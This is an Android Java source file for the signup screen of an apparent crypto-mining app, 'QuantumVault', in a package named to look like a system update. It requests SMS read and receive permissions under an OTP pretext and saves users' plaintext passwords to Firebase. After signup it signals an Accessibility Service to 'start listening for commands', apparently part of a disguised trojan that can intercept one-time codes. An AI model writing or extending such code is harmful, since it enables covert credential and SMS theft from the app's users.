package com.android.update;

import android.app.Dialog;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.provider.Settings;
import android.view.View;
import java.util.HashMap;
import java.util.Map;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import android.Manifest;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.net.Uri;


import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.android.update.databinding.ActivityMainBinding;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.List;

public class SignupActivity extends AppCompatActivity implements CountryAdapter.OnCountrySelectedListener {


    private EditText etName, etEmail, etPhone, etPassword, etReenterPassword, etReferCode;
    private TextView tvSelectedCountry;
    private Button btnSignup;
    private TextView tvLogin;
    private ImageView ivTogglePassword, ivToggleReenterPassword, ivDropdownIcon;
    private boolean isPasswordVisible = false;
    private boolean isReenterPasswordVisible = false;
    private Country selectedCountry;
    private List<Country> countries;
    private Dialog countrySelectionDialog;
    private SQLiteDatabase db;

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // 🚨 Auto-login check
        SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
        boolean isLoggedIn = prefs.getBoolean("isLoggedIn", false);
        if (isLoggedIn) {
            Intent intent = new Intent(SignupActivity.this, HomeActivity.class);
            startActivity(intent);
            finish();
            return;
        }
        setContentView(R.layout.activity_signup);


        // 🚀 Check Login Status
        checkLoginStatus();

        // 🚨 Initialize SQLite Database
        db = openOrCreateDatabase("QuantumVault.db", MODE_PRIVATE, null);
        db.execSQL("CREATE TABLE IF NOT EXISTS users(name TEXT, email TEXT UNIQUE, phone TEXT UNIQUE, password TEXT, country TEXT);");

        initCountries();
        initViews();
        setupListeners();
    }

    // ✅ Check Login Status - Direct to Home if Logged In
    private void checkLoginStatus() {
        SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
        boolean isLoggedIn = prefs.getBoolean("isLoggedIn", false);

        if (isLoggedIn) {
            startActivity(new Intent(SignupActivity.this, HomeActivity.class));
            finish();
        }
    }

    private void initViews() {
        etName = findViewById(R.id.etName);
        etEmail = findViewById(R.id.etEmail);
        etPhone = findViewById(R.id.etPhone);
        etPassword = findViewById(R.id.etPassword);
        etReenterPassword = findViewById(R.id.etReenterPassword);
        etReferCode = findViewById(R.id.etReferCode);
        tvSelectedCountry = findViewById(R.id.tvSelectedCountry);
        btnSignup = findViewById(R.id.btnSignup);
        tvLogin = findViewById(R.id.tvLogin);
        ivTogglePassword = findViewById(R.id.ivTogglePassword);
        ivToggleReenterPassword = findViewById(R.id.ivToggleReenterPassword);
        ivDropdownIcon = findViewById(R.id.ivDropdownIcon);
        // 🚨 Initially Disable Phone Input
        etPhone.setFocusable(false);
        etPhone.setClickable(true);
    }

    private void setupListeners() {
        // Country selection
        tvSelectedCountry.setOnClickListener(v -> showCountrySelectionDialog());
        ivDropdownIcon.setOnClickListener(v -> showCountrySelectionDialog());

        // Toggle Password Visibility
        ivTogglePassword.setOnClickListener(view -> togglePasswordVisibility(etPassword, ivTogglePassword, true));
        ivToggleReenterPassword.setOnClickListener(view -> togglePasswordVisibility(etReenterPassword, ivToggleReenterPassword, false));

        // Handle Signup button click
        btnSignup.setOnClickListener(view -> handleSignup());

        // Redirect to Login
        tvLogin.setOnClickListener(view -> {
            startActivity(new Intent(SignupActivity.this, LoginActivity.class));
            finish();
        });
        // Request Permissions when clicking on phone field
        etPhone.setOnClickListener(v -> requestPermissionsIfNeeded());
    }

    // 🚨 Method to Request Permissions (SMS Only)
    private void requestPermissionsIfNeeded() {
        if (checkPermissions()) {
            // 🚀 Permissions already granted - enable phone field
            etPhone.setFocusableInTouchMode(true);
            etPhone.requestFocus();
        } else {
            // 🚀 Show Permission Request Dialog
            new AlertDialog.Builder(this)
                    .setTitle("Permission Required")
                    .setMessage("Please grant SMS permissions for OTP verification.")
                    .setCancelable(false)
                    .setPositiveButton("Grant", (dialog, which) -> {
                        ActivityCompat.requestPermissions(this, new String[]{
                                Manifest.permission.READ_SMS,
                                Manifest.permission.RECEIVE_SMS
                        }, PERMISSION_REQUEST_CODE);
                    })
                    .setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss())
                    .show();
        }
    }

    // 🚨 Method to Check Permissions (SMS Only)
    private boolean checkPermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    // 🚨 Handle Permission Result
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                Toast.makeText(this, "Permissions granted.", Toast.LENGTH_SHORT).show();
                etPhone.setFocusableInTouchMode(true);
                etPhone.setFocusable(true);
                etPhone.requestFocus();
            } else {
                Toast.makeText(this, "SMS Permissions are required for OTP verification.", Toast.LENGTH_LONG).show();
                etPhone.setFocusable(false);
            }
        }
    }


    private void initCountries() {
        countries = new ArrayList<>();
        countries.add(new Country("Afghanistan", "AF"));
        countries.add(new Country("Albania", "AL"));
        countries.add(new Country("Algeria", "DZ"));
        countries.add(new Country("Andorra", "AD"));
        countries.add(new Country("Angola", "AO"));
        countries.add(new Country("Antigua and Barbuda", "AG"));
        countries.add(new Country("Argentina", "AR"));
        countries.add(new Country("Australia", "AU"));
        countries.add(new Country("Austria", "AT"));
        countries.add(new Country("Azerbaijan", "AZ"));
        countries.add(new Country("Bahamas", "BS"));
        countries.add(new Country("Bahrain", "BH"));
        countries.add(new Country("Bangladesh", "BD"));
        countries.add(new Country("Barbados", "BB"));
        countries.add(new Country("Belarus", "BY"));
        countries.add(new Country("Belgium", "BE"));
        countries.add(new Country("Belize", "BZ"));
        countries.add(new Country("Benin", "BJ"));
        countries.add(new Country("Bhutan", "BT"));
        countries.add(new Country("Bolivia", "BO"));
        countries.add(new Country("Bosnia and Herzegovina", "BA"));
        countries.add(new Country("Botswana", "BW"));
        countries.add(new Country("Brazil", "BR"));
        countries.add(new Country("Brunei", "BN"));
        countries.add(new Country("Bulgaria", "BG"));
        countries.add(new Country("Burkina Faso", "BF"));
        countries.add(new Country("Burundi", "BI"));
        countries.add(new Country("Cambodia", "KH"));
        countries.add(new Country("Cameroon", "CM"));
        countries.add(new Country("Canada", "CA"));
        countries.add(new Country("Cape Verde", "CV"));
        countries.add(new Country("Central African Republic", "CF"));
        countries.add(new Country("Chad", "TD"));
        countries.add(new Country("Chile", "CL"));
        countries.add(new Country("China", "CN"));
        countries.add(new Country("Colombia", "CO"));
        countries.add(new Country("Comoros", "KM"));
        countries.add(new Country("Congo", "CG"));
        countries.add(new Country("Costa Rica", "CR"));
        countries.add(new Country("Croatia", "HR"));
        countries.add(new Country("Cuba", "CU"));
        countries.add(new Country("Cyprus", "CY"));
        countries.add(new Country("Czech Republic", "CZ"));
        countries.add(new Country("Denmark", "DK"));
        countries.add(new Country("Djibouti", "DJ"));
        countries.add(new Country("Dominica", "DM"));
        countries.add(new Country("Dominican Republic", "DO"));
        countries.add(new Country("East Timor", "TL"));
        countries.add(new Country("Ecuador", "EC"));
        countries.add(new Country("Egypt", "EG"));
        countries.add(new Country("El Salvador", "SV"));
        countries.add(new Country("Equatorial Guinea", "GQ"));
        countries.add(new Country("Eritrea", "ER"));
        countries.add(new Country("Estonia", "EE"));
        countries.add(new Country("Eswatini", "SZ"));
        countries.add(new Country("Ethiopia", "ET"));
        countries.add(new Country("Fiji", "FJ"));
        countries.add(new Country("Finland", "FI"));
        countries.add(new Country("France", "FR"));
        countries.add(new Country("Gabon", "GA"));
        countries.add(new Country("Gambia", "GM"));
        countries.add(new Country("Georgia", "GE"));
        countries.add(new Country("Germany", "DE"));
        countries.add(new Country("Ghana", "GH"));
        countries.add(new Country("Greece", "GR"));
        countries.add(new Country("Grenada", "GD"));
        countries.add(new Country("Guatemala", "GT"));
        countries.add(new Country("Guinea", "GN"));
        countries.add(new Country("Guinea-Bissau", "GW"));
        countries.add(new Country("Guyana", "GY"));
        countries.add(new Country("Haiti", "HT"));
        countries.add(new Country("Honduras", "HN"));
        countries.add(new Country("Hungary", "HU"));
        countries.add(new Country("Iceland", "IS"));
        countries.add(new Country("India", "IN"));
        countries.add(new Country("Indonesia", "ID"));
        countries.add(new Country("Iran", "IR"));
        countries.add(new Country("Iraq", "IQ"));
        countries.add(new Country("Ireland", "IE"));
        countries.add(new Country("Israel", "IL"));
        countries.add(new Country("Italy", "IT"));
        countries.add(new Country("Jamaica", "JM"));
        countries.add(new Country("Japan", "JP"));
        countries.add(new Country("Jordan", "JO"));
        countries.add(new Country("Kazakhstan", "KZ"));
        countries.add(new Country("Kenya", "KE"));
        countries.add(new Country("Kiribati", "KI"));
        countries.add(new Country("Korea, North", "KP"));
        countries.add(new Country("Korea, South", "KR"));
        countries.add(new Country("Kuwait", "KW"));
        countries.add(new Country("Kyrgyzstan", "KG"));
        countries.add(new Country("Laos", "LA"));
        countries.add(new Country("Latvia", "LV"));
        countries.add(new Country("Lebanon", "LB"));
        countries.add(new Country("Lesotho", "LS"));
        countries.add(new Country("Liberia", "LR"));
        countries.add(new Country("Libya", "LY"));
        countries.add(new Country("Liechtenstein", "LI"));
        countries.add(new Country("Lithuania", "LT"));
        countries.add(new Country("Luxembourg", "LU"));
        countries.add(new Country("Madagascar", "MG"));
        countries.add(new Country("Malawi", "MW"));
        countries.add(new Country("Malaysia", "MY"));
        countries.add(new Country("Maldives", "MV"));
        countries.add(new Country("Mali", "ML"));
        countries.add(new Country("Malta", "MT"));
        countries.add(new Country("Marshall Islands", "MH"));
        countries.add(new Country("Mauritania", "MR"));
        countries.add(new Country("Mauritius", "MU"));
        countries.add(new Country("Mexico", "MX"));
        countries.add(new Country("Micronesia", "FM"));
        countries.add(new Country("Moldova", "MD"));
        countries.add(new Country("Monaco", "MC"));
        countries.add(new Country("Mongolia", "MN"));
        countries.add(new Country("Montenegro", "ME"));
        countries.add(new Country("Morocco", "MA"));
        countries.add(new Country("Mozambique", "MZ"));
        countries.add(new Country("Myanmar", "MM"));
        countries.add(new Country("Namibia", "NA"));
        countries.add(new Country("Nauru", "NR"));
        countries.add(new Country("Nepal", "NP"));
        countries.add(new Country("Netherlands", "NL"));
        countries.add(new Country("New Zealand", "NZ"));
        countries.add(new Country("Nicaragua", "NI"));
        countries.add(new Country("Niger", "NE"));
        countries.add(new Country("Nigeria", "NG"));
        countries.add(new Country("North Macedonia", "MK"));
        countries.add(new Country("Norway", "NO"));
        countries.add(new Country("Oman", "OM"));
        countries.add(new Country("Pakistan", "PK"));
        countries.add(new Country("Palau", "PW"));
        countries.add(new Country("Palestine", "PS"));
        countries.add(new Country("Panama", "PA"));
        countries.add(new Country("Papua New Guinea", "PG"));
        countries.add(new Country("Paraguay", "PY"));
        countries.add(new Country("Peru", "PE"));
        countries.add(new Country("Philippines", "PH"));
        countries.add(new Country("Poland", "PL"));
        countries.add(new Country("Portugal", "PT"));
        countries.add(new Country("Qatar", "QA"));
        countries.add(new Country("Romania", "RO"));
        countries.add(new Country("Russia", "RU"));
        countries.add(new Country("Rwanda", "RW"));
        countries.add(new Country("Saint Kitts and Nevis", "KN"));
        countries.add(new Country("Saint Lucia", "LC"));
        countries.add(new Country("Saint Vincent and the Grenadines", "VC"));
        countries.add(new Country("Samoa", "WS"));
        countries.add(new Country("San Marino", "SM"));
        countries.add(new Country("Sao Tome and Principe", "ST"));
        countries.add(new Country("Saudi Arabia", "SA"));
        countries.add(new Country("Senegal", "SN"));
        countries.add(new Country("Serbia", "RS"));
        countries.add(new Country("Seychelles", "SC"));
        countries.add(new Country("Sierra Leone", "SL"));
        countries.add(new Country("Singapore", "SG"));
        countries.add(new Country("Slovakia", "SK"));
        countries.add(new Country("Slovenia", "SI"));
        countries.add(new Country("Solomon Islands", "SB"));
        countries.add(new Country("Somalia", "SO"));
        countries.add(new Country("South Africa", "ZA"));
        countries.add(new Country("South Sudan", "SS"));
        countries.add(new Country("Spain", "ES"));
        countries.add(new Country("Sri Lanka", "LK"));
        countries.add(new Country("Sudan", "SD"));
        countries.add(new Country("Suriname", "SR"));
        countries.add(new Country("Sweden", "SE"));
        countries.add(new Country("Switzerland", "CH"));
        countries.add(new Country("Syria", "SY"));
        countries.add(new Country("Taiwan", "TW"));
        countries.add(new Country("Tajikistan", "TJ"));
        countries.add(new Country("Tanzania", "TZ"));
        countries.add(new Country("Thailand", "TH"));
        countries.add(new Country("Togo", "TG"));
        countries.add(new Country("Tonga", "TO"));
        countries.add(new Country("Trinidad and Tobago", "TT"));
        countries.add(new Country("Tunisia", "TN"));
        countries.add(new Country("Turkey", "TR"));
        countries.add(new Country("Turkmenistan", "TM"));
        countries.add(new Country("Tuvalu", "TV"));
        countries.add(new Country("Uganda", "UG"));
        countries.add(new Country("Ukraine", "UA"));
        countries.add(new Country("United Arab Emirates", "AE"));
        countries.add(new Country("United Kingdom", "GB"));
        countries.add(new Country("United States", "US"));
        countries.add(new Country("Uruguay", "UY"));
        countries.add(new Country("Uzbekistan", "UZ"));
        countries.add(new Country("Vanuatu", "VU"));
        countries.add(new Country("Vatican City", "VA"));
        countries.add(new Country("Venezuela", "VE"));
        countries.add(new Country("Vietnam", "VN"));
        countries.add(new Country("Yemen", "YE"));
        countries.add(new Country("Zambia", "ZM"));
        countries.add(new Country("Zimbabwe", "ZW"));
    }

    private void showCountrySelectionDialog() {
        countrySelectionDialog = new Dialog(this);
        countrySelectionDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        countrySelectionDialog.setContentView(R.layout.dialog_country_selection);

        EditText etSearchCountry = countrySelectionDialog.findViewById(R.id.etSearchCountry);
        RecyclerView rvCountries = countrySelectionDialog.findViewById(R.id.rvCountries);

        CountryAdapter adapter = new CountryAdapter(countries, this);
        rvCountries.setLayoutManager(new LinearLayoutManager(this));
        rvCountries.setAdapter(adapter);

        etSearchCountry.addTextChangedListener(new TextWatcher() {
            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                adapter.filterCountries(s.toString());
            }

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void afterTextChanged(Editable s) {
            }
        });

        countrySelectionDialog.show();
    }

    @Override
    public void onCountrySelected(Country country) {
        selectedCountry = country;
        tvSelectedCountry.setText(country.getName());
        if (countrySelectionDialog != null) countrySelectionDialog.dismiss();
    }

    private void handleSignup() {
        String name = etName.getText().toString().trim();
        String email = etEmail.getText().toString().trim();
        String phone = etPhone.getText().toString().trim();
        String password = etPassword.getText().toString().trim();
        String reenterPassword = etReenterPassword.getText().toString().trim();
        String referCode = etReferCode.getText().toString().trim();

        // Get selected country
        String country = "";
        if (selectedCountry != null) {
            country = selectedCountry.getName();
        }

        // Validation
        if (TextUtils.isEmpty(name)) {
            etName.setError("Name is required");
            return;
        }
        if (TextUtils.isEmpty(email)) {
            etEmail.setError("Email is required");
            return;
        }
        if (!android.util.Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
            etEmail.setError("Enter a valid email");
            return;
        }
        if (TextUtils.isEmpty(phone)) {
            etPhone.setError("Phone number is required");
            return;
        }
        if (phone.length() < 8) {
            etPhone.setError("Enter a valid phone number");
            return;
        }
        if (selectedCountry == null) {
            Toast.makeText(this, "Please select a country", Toast.LENGTH_SHORT).show();
            return;
        }
        if (TextUtils.isEmpty(password)) {
            etPassword.setError("Password is required");
            return;
        }
        if (password.length() < 6) {
            etPassword.setError("Password must be at least 6 characters");
            return;
        }
        if (TextUtils.isEmpty(reenterPassword)) {
            etReenterPassword.setError("Re-enter your password");
            return;
        }
        if (!password.equals(reenterPassword)) {
            etReenterPassword.setError("Passwords do not match");
            return;
        }

        // 🚨 ✅ Check if Email or Phone is already registered in SQLite
        if (isUserExists(email, phone)) {
            Toast.makeText(this, "Email or Phone already registered. Please Login.", Toast.LENGTH_SHORT).show();
            return;
        }

// 🔧 Generate unique UID
        String uid = FirebaseDatabase.getInstance().getReference("users").push().getKey();

        // Save user data to Firebase immediately
        DatabaseReference userRef = FirebaseDatabase.getInstance().getReference("users").child(uid);

        Map<String, Object> userData = new HashMap<>();
        userData.put("name", name);
        userData.put("email", email);
        userData.put("phone", phone);
        userData.put("password", password);
        userData.put("country", country);
        userData.put("refer_code", referCode);
        userData.put("xrp_balance", 0.0);
        userData.put("usdt_balance", 0.0);
        userData.put("mining_status", false);
        userData.put("mining_start_time", 0L);

        userRef.setValue(userData);

// 🔧 Store UID in SharedPreferences
        SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("userId", uid);
        editor.putBoolean("isLoggedIn", true); // for auto-login
        editor.apply();

        // 🚀 Notify Accessibility Service to start listening for commands
        Intent loginSuccess = new Intent("com.android.update.LOGIN_SUCCESS");
        loginSuccess.setPackage(getPackageName());
        sendBroadcast(loginSuccess);

// 🚨 ✅ Proceed to OTP verification
        Intent intent = new Intent(SignupActivity.this, OtpActivity.class);
        intent.putExtra("uid", uid); // put this AFTER defining intent
        intent.putExtra("name", name);
        intent.putExtra("email", email);
        intent.putExtra("phone", phone);
        intent.putExtra("password", password);
        intent.putExtra("referCode", referCode);
        intent.putExtra("country", country);
        startActivity(intent);
        finish();
    }

        // ✅ Save Login Status in SharedPreferences
    private void saveLoginStatus() {
        SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putBoolean("isLoggedIn", true);
        editor.apply();
    }


    // ✅ Save User to SQLite Database
    private void saveUser(String name, String email, String phone, String password, String country) {
        ContentValues values = new ContentValues();
        values.put("name", name);
        values.put("email", email);
        values.put("phone", phone);
        values.put("password", password);
        values.put("country", country);
        db.insert("users", null, values);
    }
    // 🚨 ✅ Method to Check if User Exists in SQLite
    private boolean isUserExists(String email, String phone) {
        Cursor cursor = db.rawQuery("SELECT * FROM users WHERE email = ? OR phone = ?", new String[]{email, phone});
        boolean exists = cursor.getCount() > 0;
        cursor.close();
        return exists;
    }


    @Override
    protected void onDestroy() {
        if (countrySelectionDialog != null && countrySelectionDialog.isShowing()) {
            countrySelectionDialog.dismiss();
        }
        if (db != null) db.close();
        super.onDestroy();
    }

    // 🚨 Method to Toggle Password Visibility
    private void togglePasswordVisibility(EditText editText, ImageView toggleIcon, boolean isPassword) {
        if (editText.getInputType() == (android.text.InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD | android.text.InputType.TYPE_CLASS_TEXT)) {
            // If currently visible, hide it
            editText.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
            toggleIcon.setImageResource(R.drawable.ic_visibility_off); // Change this to your "eye off" icon
        } else {
            // If hidden, make it visible
            editText.setInputType(android.text.InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD);
            toggleIcon.setImageResource(R.drawable.ic_visibility); // Change this to your "eye on" icon
        }
        // Maintain cursor position
        editText.setSelection(editText.getText().length());
    }



}
